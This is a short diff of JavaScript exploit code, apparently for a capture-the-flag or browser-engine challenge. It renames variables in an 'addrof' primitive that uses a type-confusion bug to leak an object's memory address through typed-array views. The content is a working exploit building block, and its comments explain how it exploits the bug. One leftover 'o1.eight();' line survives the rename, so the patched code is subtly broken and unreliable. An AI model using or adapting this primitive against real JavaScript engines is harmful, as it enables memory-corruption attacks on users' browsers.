@@ -3,17 +3,17 @@ let f64 = new Float64Array(buff);
 let u32 = new Uint32Array(buff);
 
 let addrof = function(obj){
-    let o1 = {"int" : 420, "object" : obj};
+    let first = {"int" : 420, "object" : obj};
     o1.eight();
-    let o = {"val" : o1.int, "floattag" : 7};
+    let second = {"val" : first.int, "floattag" : 7};
     // shift the second value plane
     // suddenly, value of thing is now tagged with a float!
-    o.eight();
+    second.eight();
     // translation
-    f64[0] = o.val;
+    f64[0] = second.val;
     // reshift to not corrupt pointers
-    o1.eight();
-    o.eight();
+    first.eight();
+    second.eight();
     // u32[1] = top bits
     // u32[0] = bottom bits
     // convert hex address to decimal number
